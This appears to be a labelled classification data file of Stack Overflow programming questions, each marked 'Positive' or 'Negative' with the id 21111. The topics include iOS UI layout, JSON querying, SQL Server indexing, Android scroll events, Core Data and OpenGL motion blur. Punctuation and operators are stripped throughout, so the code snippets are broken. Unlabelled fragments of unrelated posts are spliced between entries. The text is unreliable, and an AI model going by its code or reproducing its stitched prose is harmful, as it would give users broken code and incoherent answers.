Positive 21111 pCurrently I have multiple codeUIButtoncodes that have an image on the left side added through the IB.

Currently I am doing it in this mannerp  precodeUIImageView rightArrow  [[UIImageView alloc] initWithImage[UIImage imageNamedmenuarrow.png]] rightArrow.frame  CGRectMakebutton.frame.size.width  32, button.frame.size.height2  9, 17, 17 rightArrow.tag  22 [button addSubviewrightArrow] codepre  pThis works great in adding the button and placing it on the right side. However, doing this in the codeViewDidLoadcode method creates issues. In the IB the width of the button is the width of the view. So in the codeViewDidLoadcode method the buttons width hasnt been changed by autolayout. So it doesnt show up on the far right side.p  pSo I moved it to the codeViewDidLayoutSubviewscode. But on iOS 8, this is called multiple times And on iOS 7 its called once Also, in iOS 8 the LAST call by codeViewDidLayoutSubviewscode is the most accurate in terms of placing the imagep  pHow can I solve this particular issue Also Id like to do this programatically rather than try and mess with the IB if possible. p  pEdit Turns out the best answer IMO was from Mr. T in the comments which stats putting the code in codeViewDidAppearcode and then doing a check if youve already added the codeImageViewcodeto the button. p

Positive 21111 pImagine an app like Wikipedia for the Apple TV, where it has a block of text that contains information about a given topic. Some words or phrases in the text could be other available topics you could read. Therefore you need to make those wordsphrases into focusable and clickable buttons.p  pOn a web page its really easy to do this with links, and its easy to style the links to look different from the noninteractive text. On tvOS, it would be easy to apply attributes to ranges in the text using codeNSAttributedStringcode where you can determine the start and end index of the phrases  thats not a problem.p  pMy question is, how would you go about actually creating the focusable buttons for text that is in the text view I was thinking about somehow determining the rect that surrounds each phrase, and adding invisible buttons on top of them, then when it becomes focused make it visible so the user knows its active. Im not convinced thats a good approach. Also allowing all buttons to be focusable as expected could be tricky.p  pLooking into this, others have recommended using a web view and showing that in the app because its easy to make the buttons links inside a paragraph tag for example. But codeUIWebViewcode isnt available for tvOS. p  pWhats a good solution to this problem It will need to allow the user to intuitively focus and navigate between the text buttons. In this specific case, we could assume the text view will not scroll, therefore a codeUILabelcode could be used instead of a codeUITextViewcode if necessary.p  pWikipedia on the web  need to map to Apple TV appp  pa hrefhttpi.stack.imgur.com6DxVC.png relnofollowimg srchttpi.stack.imgur.com6DxVC.png altWikipediaap

Positive 21111 pI have a UICollectionView with approximately 100 cells with a strongrounded buttonstrong inside each cell. 5 cells per row, so I have to scroll down and up to select the buttons.p  pWhen the buttons are selected, the background image changes. Ive done this in several ways which I expose below. Maybe it is not a very demanding view, but I was wondering what is the less expensive approach in terms of performance.p  pOne solution I found is using an extension of codeUIImagecode  and setting the codebutton.layer.cornerRadiuscode like thisp  precodeextension UIImage    class func imageWithColorcolor UIColor gt UIImage      let rect  CGRectMake0.0, 0.0, 1.0, 1.0      UIGraphicsBeginImageContextWithOptionsrect.size, false, 0     let context  UIGraphicsGetCurrentContext      if let color  color          color.setFill          else          UIColor.whiteColor.setFill           CGContextFillRectcontext, rect      let image  UIGraphicsGetImageFromCurrentImageContext     UIGraphicsEndImageContext      return image  codepre  pand then, setting the button image background withp  precodebutton.layer.cornerRadius  cell.bounds.width  8  2 button.clipsToBounds  true button.setBackgroundImageUIImage.imageWithColorUIColor.greenColor, forState UIControlState.Selected codepre  pIve heard that setting the codelayer.cornerRadiuscode is pretty expensive.p  pAnother approach would be just designing an squared image, in Photoshop or similar, with a circle in the middle and letting the rest transparent and setting it as button background.p  pOr another option, that I still havent tried, I think it could be making an 1 x 1 pixels image with a color and setting the filling of the background as tileI still haven checked the code for this one. But I think this is pretty similar to the first way.p  pWould you solve this questions measuring the performance with any software or just knowing more deeply the Swift languagep

However, this DTO will be sent to a Flex application swf. Normally, a collection for instance, will only be loaded when called.

Negative 21111 pIs there a roughly SQL or XQuerylike language for querying JSONp  pIm thinking of very small datasets that map nicely to JSON where it would be nice to easily answer queries such as what are all the values of X where Y  3 or to do the usual SUM  COUNT type operations.p  pAs completely madeup example, something like thisp  precode[x 2, y 0, x 3, y 1, x 4, y 1]  SUMX WHERE Y gt 0     would equate to 7 LISTX WHERE Y gt 0    would equate to [3,4] codepre  pIm thinking this would work both clientside and serverside with results being converted to the appropriate languagespecific data structure or perhaps kept as JSONp  pA quick Googling suggests that people have thought about it and implemented a few things a hrefhttpwww.jaql.orgrelease0.1jaqloverview.html relnofollowJAQLa, but it doesnt seem like a standard usage or set of libraries has emerged yet. While each function is fairly trivial to implement on its own, if someone has already done it right I dont want to reinvent the wheel.p  pAny suggestionsp  pEdit This may indeed be a bad idea or JSON may be too generic a format for what Im thinking.. The reason for wanting a query language instead of just doing the summingetc functions directly as needed is that I hope to build the queries dynamically based on userinput. Kinda like the argument that we dont need SQL, we can just write the functions we need. Eventually that either gets out of hand or you end up writing your own version of SQL as you push it further and further. Okay, I know that is a bit of a silly argument, but you get the idea..p
Negative 21111 pForgive me, Im completely new to parsing and lexyacc, and Im probably in way over my head, but nonethelessp  pIm writing a pretty basic calculator with PLY, but its input might not always be an equation, and I need to determine if it is or not when parsing. The extremes of the input would be something that evaluates perfectly to an equation, which it parses fine and calculates, or something that is nothing like an equation, which fails parsing and is also fine.p  pThe gray area is an input that has equationlike parts, of which the parser will grab and work out. This isnt what I want  I need to be able to tell if parts of the string didnt get picked up and tokenized so I can throw back an error, but I have no idea how to do this.p  pDoes anyone know how I can define, basically, a catch anything thats left token Or is there a better way I can handle thisp

Negative 21111 pIm using a VS 2008 Setup and Deployment project to deploy a mixed managed  unmanaged application.  Ive had trouble registering mixedmode DLLs using the builtin registration property vsdraCOM enumerated value of the Register property.  As a workaround, Ive added a .NET custom install assembly with a class that derives from System.Configuration.Install.Installer.  Im certain that that class is running and a number of operations successfully install and uninstall through code in that assembly, including executing the DllUnRegisterServer entry point of a number of assemblies.  p  pHowever, one DLL is not successfully registering.  It is the only DLL that depends on some 3rdparty redistributable assemblies that want to be installed to the GAC.  I have those assemblies installed to the GAC thanks to the builtin support for that in VS 2008s setup and deployment projects, and I know that is working.  Ive confirmed that what is happening is that the custom action is executing before the installer executes the GAC installation.  p  pWhew.  So my question is, is there a way to force the installer to execute the GAC installation before executing the custom action  Is there a way to use the Condition property of the custom action to do this  If not, whats my best alternative  Capturing the registry entries from the DLL and adding them to the registry settings for the installer dont like this because someone may add new COM servers to the class in the future  Using .NET code to install the assembly into the GAC manually dont know how to do that yetp  pThanks,p  pDavep

Negative 21111 pHi everybody on stackoverflow.p  h1SHORT VERSION h1  pI need to use x,y,z acceleration values related only to the movement of the iPhone. Just to be clear, think an environment like a car. The iPhones accelerometer is very sensitive. If I log acceleration values with a frequency of 100Hz, there are so many values related to noise, car vibrations and other acceleration vectors which are not directed like the iPhone motion for example, dampers oscillations cause acceleration vectors directed along zaxis.p  pIn other words, I need to filter accelerations detection in a way capable to isolate accelerations whose direction is the same within a certain offset of the motion direction.p  h1DEEPER CONSIDERATIONS h1  pObviously, I could fix the iphone position so that its y axis overlaps the movement direction in the previous car environment, this means fixing the iphone y axis parallel to the front direction. The problem is that I need to allow iphones relative moments. I cant fix the iphone position.p  pFirst of all I analyzed values produced by noise and oscillations, and I figured out that their magnitude is often very higher than normal car accelerations. Filtering the magnitude is a good idea to ease the problem but its not a solution on one side many unwanted noise accelerations are not filtered because their magnitude falls within the range, on the other side many wanted motion accelerations are filtered because they falls outside the range.p  pOn the iPhone 3GS I can use the magnetometer to measure degrees heading relative to magnetic North. I could use this to find the direction of motion but the problem is still there  magneticHeading value is always measured relative to the top of the device. So the iPhone should be fixed along the front direction.p  pI cant think any other solution. Ideas Tank youp

The codeActivityFormFieldcode table also contains information like the order in which the given field should be displayed on the given activity form.  p  pExpected usage is as followsp  ul liThere will eventually be a lot of activity forms and fields, but each activity form will only have a handful of fields attached to it maybe a dozen, on average.li liThe most common query on this table will be to retrieve all of the entries in codeActivityFormFieldcode table with a given codeActivityFormIdcode, and join that data with the codeFieldcode and codeActivityFormFieldValidatorcode tables.li liNew codeActivityFormFieldcode entries will be created every so often, but not nearly as often as the query mentioned above.li ul  pMy initial reaction is to configure the ActivityFormField table with the following keys and indexesp  ul liPrimary Key on the identity column, with a Clustered Index on it.li liA Unique, nonclustered index that includes the codeFieldIdcode and codeActivityFormIdcode columns.li ul  pIn addition to feeling the most right or normal to me, this satisfies the basic requirements ofp  ul limaking sure there is only one codeActivityFormFieldcode entry for any combination of codeActivityFormcode and codeFieldcode, li liproviding an indexed key for codeActivityFormFieldValidatorcode entries to attach to, andli liproviding an indexed key on codeActivityFormIdcode for the query mentioned earlierli ul  pIt also does no harm with its clustered index, in the sense that insertion of new codeActivityFormFieldcode entries shouldnt cause any reordering of the actual data.p  pHowever, given the way that we are planning to use the table, I wonder if theres another combination of keys and indexes and clustering that is likely to be much more efficientp  h2Updateh2  pHaving done some additional research and thinking, Im leaning toward making my table declaration look something like thisp  precodeCREATE TABLE [ActivityFormField]     [ActivityFormFieldId] [int] IDENTITY1,1 NOT NULL,     [ActivityFormId] [int] NOT NULL,     [FieldId] [int] NOT NULL,     [SortOrder] [tinyint] NOT NULL,     CONSTRAINT [PKActivityFormField] PRIMARY KEY NONCLUSTERED           [ActivityFormFieldId] ASC     ,     CONSTRAINT [UKActivityFormFieldActivityFormField] UNIQUE NONCLUSTERED          [ActivityFormId] ASC,     [FieldId] ASC        ALTER TABLE [ActivityFormField] WITH CHECK ADD CONSTRAINT [FKActivityFormFieldActivityForm] FOREIGN KEY[ActivityFormId] REFERENCES [ActivityForm] [ActivityFormId]  ALTER TABLE [ActivityFormField] WITH CHECK ADD CONSTRAINT [FKActivityFormFieldField] FOREIGN KEY[FieldId] REFERENCES [Field] [FieldId]  CREATE UNIQUE CLUSTERED INDEX IXActivityFormFieldActivityFormSortOrder ON [ActivityFormField]   [ActivityFormId] ASC, [SortOrder] ASC   CREATE NONCLUSTERED INDEX IXActivityFormFieldActivityForm ON [ActivityFormField]           [ActivityFormId]       CREATE NONCLUSTERED INDEX IXActivityFormFieldField ON [ActivityFormField]           [FieldId]      codepre  pThis approach uses a nonclustered index on the identity field, a clustered index for the criteria and order in which the most commonlyused query will retrieve the data, and a constraint to ensure that only one codeActivityFormFieldcode entry exists for any combination of codeActivityFormcode and codeFieldcode. Unique Constraints and Indexes are apparently handled the same way internally, so I chose a constraint to show that its primary purpose is to keep things unique. The other indexes are there just in case, following the logic HLGEM proposed.p

For example, if I redefine all Buttons to have textSize40dip apply that Style as a Theme for the Application and then apply another Style to a specific Button that says textSize10dip, then that specific Button should get 10dip textSize.p  pAnd that is how it works, usually.

Now we have our data in SQL Server 2005 and associated FILESTREAM data in SQL Server 2008. Being very new to SQL Server I would like to ascertain how bad is this in terms of performance How can we achieve atomicity across both the database versions, is it via using a linked server or some other mechanism Any alternative solutions would be fine except that we just cannot migrate the existing application to SQL Server 2008. p

Negative 21111 pI have a lot of templates that are enclosed within script tags. They are pure html, but Visual Studio grays them out.

Negative 21111 pIm trying to detect the scroll event in Android browser my specific version is 2.1, but U want it to work also on older versions. This seems impossiblep  pI first tried thisp  precodedocument.addEventListenerscroll, function alerttest , false codepre  pBut nothing is triggered except when the page load.p  pI thought well, lets be crazy and emulate it by   1. Detecting touchend  2. Polling the window.pageYOffset so we know when the window stops scrolling  3. Manually trigger a user function I want on scroll.p  pUnfortunately, the touchend event doesnt look to be triggered either... in fact, when we dont scroll and only tap the screen touchstart  touchend, it works. As soon as we scroll the page in between touchstart  touchmove  touchend, it breaks everything.p  pNow my most basic example only contains thisp  precodedocument.addEventListenertouchend, function alerttest , false codepre  pBut the alert doesnt show up when we scroll with the finger and release the touch...p  pDoes anyone has a suggestionp  pThanks.p

Negative 21111 pThis question came up during working with web servicesin java but I guess could apply in all kind of web applications http.br If an HTTP client sends a POST to a server then, a 202 Accepted has the meaning according to HTTP protocol that the POST has been accepted and the request will be eventually processed.br Under other conditions, the server could send a 200 OK response with NO body, if there is no response body to send to the client may be the request POST does not actually trigger a response body.br Although strongconceptuallystrong, there is a difference between these 2 cases, i.e.  p  precode 202 Accepted gt Request ok, will be processed    200 OK Nobody gt Request ok, no response body   codepre  pIn real programming I do not think it should make a difference to the HTTP client code the first or the second case. I have noticed, on some java web services frameworks that these 2 cases are interchangeable, and want to know if it is the same universally, i.e. in any kind of HTTP client.br Because in both cases, the HTTP response code is valid, and there is no response to work with. And in some cases there is a 202 Accepted but in others there is a 200 OK and the response body has an empty tag i.e. codeltrootgtltrootgtcode the other elements are missing.

It is defined in the data model as a transient property with undefined type, and is declared as a property thusp  precodeproperty nonatomic, readonly NSSet  manufacturers codepre  pThis property is declared to be dependent on another 1M relationship on this objectp  precode NSSet  keyPathsForValuesAffectingManufacturers      return [NSSet setWithObjectlines]  codepre  pI have implemented a fairly standard getter for this transient propertyp  precode NSSet  manufacturers      [self willAccessValueForKeymanufacturers]     NSSet mfrs  [self primitiveManufacturers]     [self didAccessValueForKeymanufacturers]      if mfrs  nil              NSMutableSet working  [NSMutableSet set]           rebuild the set of manufacturers into working here           mfrs  working         [self setPrimitiveManufacturersmfrs]           return mfrs  codepre  pThe part that isnt working is that the cached primitive value for codemanufacturerscode doesnt appear to be wiped out when objects are added  removed from the codelinescode relationship on this object.  The codemanufacturerscode accessor is definitely called when you add  remove lines, but code[self primitiveManufacturers]code still returns the old cached value which is obviously nonnil, so the code to rebuild the current set of manufacturers isnt called and I end up with an outofdate return value.p  pAm I misunderstanding something about how cached transient property values are supposed to work  Or am I supposed to manually nullify the cached value when lines are changed through some kind of KVO callback so that the update code inside the if is executed the next time codemanufacturerscode is accessedp  pAny help much appreciated.p  pstrongEditstrong I am aware that Im basically simulating a 1M relationship with this transient property i.e. a emtransient relationshipem, for want of a better word, and Im also aware that the a hrefhttpdeveloper.apple.comlibrarymacdocumentationcocoaReferenceCoreDataFrameworkClassesNSManagedObjectClassReferenceNSManagedObject.htmlapplerefoccinstmNSManagedObjectsetPrimitiveValue3aforKey3a relnofollowdocumentationa warns against using codesetPrimitiveValueforKeycode for relationshipsp  blockquote   pYou should typically use this method   only to modify attributes usually   transient, not relationships. If you   try to set a tomany relationship to a   new NSMutableSet object, it will   eventually fail. In the unusual   event that you need to modify a   relationship using this method, you   first get the existing set using   primitiveValueForKey ensure the   method does not return nil, create a   mutable copy, and then modify the copyp blockquote  pHowever, since I am not setting a primitive value on a emrealem 1M relationship, only my simulated transient one, I had assumed that this warning did not apply to my use case.p  pstrongEdit 2strong Since I am only trying to track when objects are added or removed from the codelinescode set this is the only way the expected value of codemanufacturerscode can change, as opposed to trying to track updates to attributes on the objects that are already in the codelinescode set, I dont think I should need anything as heavyweight as this a hrefhttpsgithub.commbruggerCoreDataDependentProperties relnofollowhttpsgithub.commbruggerCoreDataDependentPropertiesap  pstrongSolutionstrong In light of the answer below, I implemented the following solution to blank out the codemanufacturerscode set when codelinescode is updated.

Negative 21111 pGreetings and thanks for readingp  pI was wondering what the best practice for encapsulating stored procedure logic using a setbased SQL technique.p  pFor example, I have a product entry application that I am developing.  While attempting to limit code duplication, I created a stored procedure called AddItem which creates a new product in the product tables.  The downside is that in order to utilize this procedure in a situation that requires adding a group of products, I am forced to use a cursor or WHILE loop to execute the procedure in a FOR EACH type of way.  This is resulting in very poor performance on large sets of items.p  pOf course I could hardcode the INSERT statements into the calling procedure but that makes me feel icky because the whole point is to be able to change in one place the add item logic.  So if a column changed I would have to remember to change all of the INSERT statements in all of the places that use it.  I just figured there has to be a better way of doing this and any advice would be appreciated.p  pEDIT Quite right, I should provide a code example.  Here is the contents of the AddItem procedure which is being executed on a MS SQL2005 databasep  precode            ALTER PROCEDURE [dbo].[AddItem]                 ProjectNumber  int,                 ItemName       varchar255,                 SupplierID     int,                 SKUType        int,                 Store          varchar3,                 Category       varchar4,                 AddedBy        varchar255,                 ParentSKU      varchar255  NULL,                 SetNumber      int  NULL,                 NewItemNumber  int OUTPUT             AS                   SET NOCOUNT ON                  DECLARE DiscontinuedStatus bit                  BEGIN TRY                     BEGIN TRAN                         SET NewItemNumber  0                          INSERT INTO ProductEntry.dbo.Items                         ProjectNumber, SetNumber, SKUType, Store, Category, AddedBy, ParentSKU, EntryTime                         VALUESProjectNumber, SetNumber, SKUType, Store, Category, AddedBy, ParentSKU, CURRENTTIMESTAMP                          SET NewItemNumber  SCOPEIDENTITY                          IF SKUType  1                         BEGIN                             SET DiscontinuedStatus  1                         END                         ELSE                         BEGIN                             SET DiscontinuedStatus  0                         END                           INSERT INTO ProductEntry.dbo.ItemInfo                         ItemNumber, ItemName, Discontinued                         VALUES NewItemNumber, ItemName, DiscontinuedStatus                          INSERT INTO ProductEntry.dbo.ItemSupplierInfo                            ItemNumber, SupplierID                         VALUESNewItemNumber, SupplierID                          INSERT INTO ProductEntry.dbo.ItemWebInfo                         ItemNumber                         VALUESNewItemNumber                          INSERT INTO ProductEntry.dbo.ItemTags                         ItemNumber                         VALUES NewItemNumber                     COMMIT TRAN                 END TRY                 BEGIN CATCH                     ROLLBACK TRAN                 END CATCH codepre  pI have a need for a procedure that adds multiple items at a time with numbers greater than 1000 and when using a cursor the performance is very bad.  It takes over a minute to add a group of 800 products and it only gets worse from there.p  pEDIT To further clarify the solution, the application allows items that have a parentchild relationship.  When adding a new parent item, the user selects from a list of options and a set of child items is generated based on the option set.p  pFor example, a user could create a product called Awesome Boot with an option set of ColorsBrown, Black, Size10M, 11M, 12M, ToeStyleSteelToe, SoftToe  this would generate a set of 12 items.  Obviously you can see how this could increase exponentially, considering that most boots have around 36 sizes, multiple colors and toe styles, as well as other options.  This can result in a parent item with a large number of child items.  p  pI guess one solution would be to combine all of the different item information into one Items table, eliminating the need for storing the same IDENTITY in multiple tables.  I kind of like the convenience of splitting up the related data logically into different tables though.  Maybe Im trying to have my cake and eat it toop  pThanks p

Negative 21111 pIm not really sure even what to search for regarding this issue, so I figured Id post it here.p  pLets say I have a bunch of interfaces like...p  precode ltsummarygt  All interesting classes will implement this interface  ltsummarygt interface IMasterInterface    ltsummarygt  Interface to represent someone that creates  produces goods  ltsummarygt interface IProduceGoods  IMasterInterface  int Prop1 get    ltsummarygt  Interface to represent someone that buys  consumes goods  ltsummarygt interface IConsumeGoods  IMasterInterface  int Prop2 get    ltsummarygt  Interface to represent someone that stores goods  ltsummarygt interface IStoreGoods  IMasterInterface  double Prop3 get string name get   ltsummarygt  Interface to represent someone that enjoys looking at goods  ltsummarygt interface IEnjoyLookingAtGoods  IMasterInterface  int Prop4 get DateTime Prop5 get  codepre  pNow, I have some combination that I know I want today, something likep  precode ltsummarygt  Class to represent a farm which grows and stores crops  ltsummarygt class Farm  IProduceGoods, IStoreGoods ...   ltsummarygt  Class to represent a merchant who buys goods and stores them  ltsummarygt class Merchant  IConsumeGoods, IStoreGoods ...   ltsummarygt  Window Shopper represents someone who doesnt buy anything and only looks  ltsummarygt class WindowShopper  IEnjoyLookingAtGoods ...  codepre  pNow Im happy that Ive got my few classes, but tomorrow, I think, wouldnt it be nice to also have a class where someone actually buys from the Merchant so Id go to my code and addp  precode ltsummarygt  Princesses have lots of money to buy stuff and lots of time to look at stuff  ltsummarygt class Princess  IEnjoyLookingAtGoods, IConsumeGoods ... codepre  pNow, I dont think I should have to do that...p  pWhat I would like to do is have a factory or similar thing and sayp  precodeIMasterInterface princess  MyFactory.CreateIEnjoyLookingAtGoods, IEnjoyLookingAtGoodsParameters, IConsumeGoods, IConsumeGoodsParameters   This should be true princess is IEnjoyLookingAtGoods ampamp princess is IConsumeGoods codepre  pEssentially, Id like to tell the factory which interfaces to use to construct the object.  I have containers that have lists of IMasterInterfacep  precode ltsummarygt  My container class for interesting objects  ltsummarygt class InterestingObjectContainer  public ReadOnlyCollectionltIMasterInterfacegt InterestingObjects get  codepre  pNow, here is where the meat of the question lies.  The reason for having all the interesting classes implement the IMasterInterface was to be able to have a List and use the more specific interfaces as filters.  Perhaps the following will make it more clearp  precode ltsummarygt  I want to see the net population of producers and get there total production  ltsummarygt class ProducerProductionCalculator     THIS IS WHERE THE MEAT OF THE QUESTION RESIDES   ProductionResults CalculateInterestingObjectContainer interestingObject        ListltIProduceGoodsgt producers  interestingObject.InterestingObjects.OfTypeltIProduceGoodsgt  Perhaps more interest LINQ     return DoSomethingWithListToAggregateproducers     codepre  pBy filtering out to the more specific interface, I can now count on all the objects passed to      DoSomethingWithListToAggregateICollection producers  having the methods  properties of the IProduceGoods class.p  pI thought about implementing this with dictionaries and string property look ups, but it feels like I can write more strongly typed code this way and ensure that a simple spelling mistake somewhere is not going to mess everything up.p  pAnyway, I guess the summary isp  pIs this a poor way of implementing variable properties on a object and if so what would be a better.  If not, is there a way to create the objects in a factory as I have tried to explain abovep  pEDITp  pI see some oks to the idea of doing this, and thats cool.  I was wondering how to create a factory that takes arguments of an interface which only has properties and the properties only have getters I think thats an important point along with property values for the properties and returns a object that implements the interface and has all the properties defined.p  pFor instance,p  precode ltsummarygt  Factory to create any combination of properties  ltsummarygt class FactoryForInterestingObjects    public static IMasterInterface Create   ListltKeyValuePairltwhat goes here is the interface that I want to use,                       what goes here are the parameter values that                        should be returned by the getter gtgt   codepre  pId pass the factory all the interfaces and their parameter values and it would create some class that implements those interfaces and has those values.  Hopefully this is a little more clearp  pEDIT 2  How to use Decoratorp  pFrom what I see about the decorator, you can extend the functionality of an object.  Thats cool.  However, you have to know ahead of time how you are extending that functionality.  You cannot do this arbitrarily.p  pConsider that my code base is as above and I want to use decorator.p  pId sayp  precode Edited to be correct class EnjoyLookingDecorator  IEnjoyLookingAtGoods    private IMasterInterface instance   public EnjoyLookingDecoratorIMasterInterface wrappedObject    this.instance  wrapped Object    region Implementation of IEnjoyLookingAtGoods   ...   endregion  codepre  pEDIT 4p  pI still dont think thatll work.  In your example, I lose the contained classes interface, I have to redirect it down.  For instance,p  precodeclass EnjoyLookingDecorator  IEnjoyLookingAtGoods    private IMasterInterface instance   public EnjoyLookingDecoratorIMasterInterface concrete    this.instance  concrete    region Implementation of IEnjoyLookingAtGoods here   ...   endregion    bool IsltTgt this should be in the IMasterInterface         return this is T or instance is T      class ConsumesGoodsDecorator  IConsumeGoods    private IMasterInterface instance   public ConsumesGoodsDecorator IMasterInterface concrete    this.instance  concrete    region Implementation of IConsumeGoods here   ...   endregion    bool IsltTgt         return this is T or instance is T     codepre  pso when you dp  precodeIMasterInterface princess  new MasterClass whatever your concrete type is named princess  new ConsumesGoodsDecoratornew EnjoyLookingDecoratorprincess codepre  pyou no longer can do princess.PropertyOnIEnjoyLookingDecoratorInterface  you lose all those properties.  This is not what I want. The only way to preserve the properties is to redirectp  precodeclass ConsumesGoodsDecorator  IConsumeGoods, IEnjoyLookingAtGoods    private IMasterInterface instance   public ConsumesGoodsDecorator IMasterInterface concrete    this.instance  concrete    region Implementation of IConsumeGoods here   ...   endregion    region Redirect all the IEnjoyLookingAtGoods Property Getters to instance    ...    endregion    bool IsltTgt         return this is T or instance is T     codepre  pBy doing the redirect, we have to implement the interface.  Then the combinations have to all have code, which is what Im trying to avoid.  I dont to have constraints on the combinations of interfaces.p  pEDIT 5p  pPerhaps Im still not clear in my question.  Imagine the interfaces as they are above with their properties filled in.p  pIf the factory could do something like thisp  precode ltsummarygt  Factory to create any combination of properties  ltsummarygt class FactoryForInterestingObjects    public static IMasterInterface Create     ListltKeyValuePairltType t, ArgSet customArgumentsgtgt interfaces        object baseObject     foreachKeyValuePairltType, ArgSetgt interface in interfaces             AddInterfaceinterface, object            private static void AddInterfaceKeyValuePairltType, ArgSetgt interface, ArgSet arguments          Delegate this to someone else      ifinterface.Key is typeofIProduceGoods              IProduceGoodsExtensions.AddInterfaceo, interface.value            public static class IProduceGoodsExtensions     public static void AddInterfaceobject o, ArgSet arguments            do something to object to make it implement IProductGoods        and make all the getters return the arguments passed in ArgSet      codepre  pI realize this is not how it will actually work, but illustrates the point Im trying to make.  I want the object to implement a dynamic combination of interfaces and have default values for the setters.p  pEven if I could do something like have the factory write a text file containing the codep  precode ltsummarygt  Auto Generated by Factory to create a new type on the fly  ltsummarygt class ClassImplementingIProduceGoodsAndIEnjoyLookingAtGoods  IProduceGoods, IEnjoyLookingAtGoods     From IProduceGoods   public int Prop1 get private set    From IEnjoyLookingAtGoods   public int Prop4 get private set   public DateTime Prop5 get private set   public ClassImplementingIProduceGoodsAndIEnjoyLookingAtGoodsint prop1, int Prop4 , DateTime Prop5        this.Prop1  prop1 this.Prop4  Prop4 this.Prop5  Prop5     codepre  pThen compile the class and somehow allow me to create instances of it.  Thats what Im looking for.  Hopefully that makes more sense.p  pEDIT 6p  pThis is the solution Ill probably go with since Im not seeing an alternative at this point.p  precodeUpdate Master Interface interface IMasterInterface     bool IsType t    IMasterInterface AsType t    ltsummarygt  Class to build up a final object  ltsummarygt class CompositionObject  IMasterInterface    ICollectionltIMasterInterfacegt parts   CompositionObjectIMasterInterface object parts  new ListltIMasterInterfaceobject   bool IsType t         foreachIMasterInterface part in parts       if part is t return true  not sure on this off top of head             return false       IMasterInterface AsType t        foreachIMasterInterface part in parts      ifpart is t return part        bool AddIMasterInterface interface    this.Istypeofinterface return false  dont add again     this.parts.Addinterface   codepre  pNow my factory can just return these composition objects and as long as As is called, I can then downcast safely.  I feel like theres probably a way to use generics to avoid the casting.p  pAny concrete classes implementing IMasterInterface can simply return themselves when As is called. p  pEDIT 3p  pThanks to everyone for comments.  Im glad I posted my ignorance of the pattern D  Thanks for the clarification  I love this site and all you lovely people out therep

Negative 21111 pI am completing an Android program to classify the genre of a song on a mobile phone.  The classification code is implemented in a native shared library not written by me.  Unfortunately, it only classifies correctly the first time, any times after then it just returns the previous result.  I was thinking this was to do with the fact that some of the variables in the code are declared static and that they are not being instantiated properly between classifications.p  pI need to know how I can free the memory associated with a native library after each classification so that all the variables are instantiated correctly in the next classification.p  pI currently call the native library via a class, can I free the class like in CC explicitly without waiting for the garbage collectorp

Negative 21111 pId like to create a motion blur effect by rendering and additively blending moving objects at multiple points in their trajectory over the course of a frame. p  pI was thinking that the calculation for determining the draw location could be performed in a vertex shader. It seems to me, though, that I might need to employ the use of a geometry shader if I want to avoid passing in the geometry for each render. p  pWhat is my best course of action I am deciding between p  ol liAssembling the vertex data for each subframe manually and passing it to the GPU each time I wouldnt need to have a vertex program if I do thisli liSend the geometry along with velocity values. I can calculate the intermediate position in a vertex shader, though Im not certain about how to specify that a certain velocity value is assigned to certain groups of primitives. I will need to send in the same vertices once for each subframe render because the vertex shader cannot create new vertices.li liUse a geometry shader to produce all geometry for all subframes. I should be able to get all of the subframes without passing any data back and forth during the entire rendering process. li ol  pThe balance I want to strike here is I want a minimum of redundant datapassing while supporting as much hardware as reasonably possible. It seems like I should be able to use a Vertex Buffer Object to store my geometry data, and just pass a few uniforms to send velocity data to the vertex shader on each render. Does that work Also a VBO buffer is persistent, so for best performance I should be stepping in and modifying geometry data on an asneeded basis, correct p  pAnother potential problem I dont know how to deal with is that I want to draw my intermediate positions accurately by interpolating the translation and rotation that rigid objects traverse over a frame, rather than just interpolating the resultant vertex positions alone. The difference here is be that a spinning object will leave a curved streak. p  pIs there some way I can prevent having to issue a call for each separate dynamic rigid object Maybe I could use a generic vertex attribute to send in my velocity It would be somewhat redundant because I could have an object with 100 vertices with the same velocity data, but at least then my shader can get a stream of this data this way.p  pIt seems to me that there might not be too much to gain by performing the vertex transformations on the GPU I would have to pass in a velocity vector, an angular velocity scalar, and a center of mass vector as vertex attributes. It seems like a big waste of bandwidth. However, I can use that data for a potentially large number of samples subframe renders. p  pIve gotten by for a very long time using the OpenGL Immediate Mode but I want to do things right this time around. p  pUPDATE See extended comment discussion for the direction this has taken. Im now fairly certain that multiple samples will not produce a good result because of the strobe light effect At some velocities Ill need to use blur for performance reasons. In that case I need to accumulate blurred subframes rendering subframes and then blurring it will still leave artifacts. p

Negative 21111 pI have a list of objects in a codeUITableViewcode, managed by a codeNSFetchedResultsControllercode. When the user selects an object, an edit view is displayed, allowing the user to edit the selected codeNSManagedObjectcode instance. The properties of the object are updated in the object as the user makes changes.p  pThe thing is, there is, as usual, a Save button and a Cancel button. If the user taps save, the codeNSManagedObjectContextcode is saved, and the change is reflected. However, if the user taps cancel, I need the object to revert to the state it was in before. Calling code[managedObjectContext rollback]code doesnt work for this purpose.p  pDoes anyone know how to properly implement this I can not store the objects properties as temporary separate ivars during editing, because there are multiple objects that could be edited, all of which have different properties.p  h3Updateh3  pWhat Im currently doing is storing the codeNSManagedObjectcode in an instance variable, and calling codesavecode to save and coderollbackcode to cancel. Instance variables are modified using either codeobject.property  somethingcode or code[object setValuesomething forKeyproperty]code.

However, if you edit again, and cancel without making changes, the state of the object reverts back as it was embeforeem the save.pli lipIf you edit and cancel, the changes are still updated, as if saved.

Negative 21111 pA lot has been written about not relying on client validation only its just a convenience for the user and reduces server processing. THIS IS NOT WHAT THIS QUESTION IS ABOUT.p  pI dont know if this is specific to ASP.NET MVC or all JQuery validation, but this is where my question comes from. When you use the ReqularExpressionAttribute with clientsidevalidation enabled, the HTML outputs with something like datavalregexpattern[09azAZ]3,12 just to throw a basic example.p  pIsnt this rather insecure, giving away explicitly what your expression is checking for and isnt checking for It seems like its much easier to exploit holes in a validation scheme when a user can easily read exactly what it is. And its the same expression that the server uses, so they can see what the server checks for too.p  pbUPDATEbp  pMy example expression isnt very good for describing the problem. Its about more complex data values that have very strict formats and you unintentionally overlook some loopholesp

